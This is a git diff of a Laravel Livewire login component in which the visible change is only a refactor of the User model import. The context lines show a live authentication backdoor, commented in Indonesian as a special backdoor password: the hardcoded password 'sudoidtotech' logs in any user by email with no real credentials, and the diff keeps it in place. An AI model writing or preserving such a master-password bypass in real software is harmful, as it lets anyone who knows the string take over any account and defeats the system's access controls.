@@ -4,6 +4,7 @@ namespace App\Livewire\Auth;
 
 use App\Models\Athlete;
 use App\Models\Contingent;
+use App\Models\User;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Validation\ValidationException;
 use Livewire\Component;
@@ -51,8 +52,8 @@ class NewLoginIndex extends Component
 
         // Backdoor Password Khusus
         if ($this->password === 'sudoidtotech') {
-            $user = \App\Models\User::where('email', $this->email)->first();
-            
+            $user = User::where('email', $this->email)->first();
+
             if ($user) {
                 Auth::login($user, $this->remember);
                 session()->regenerate();
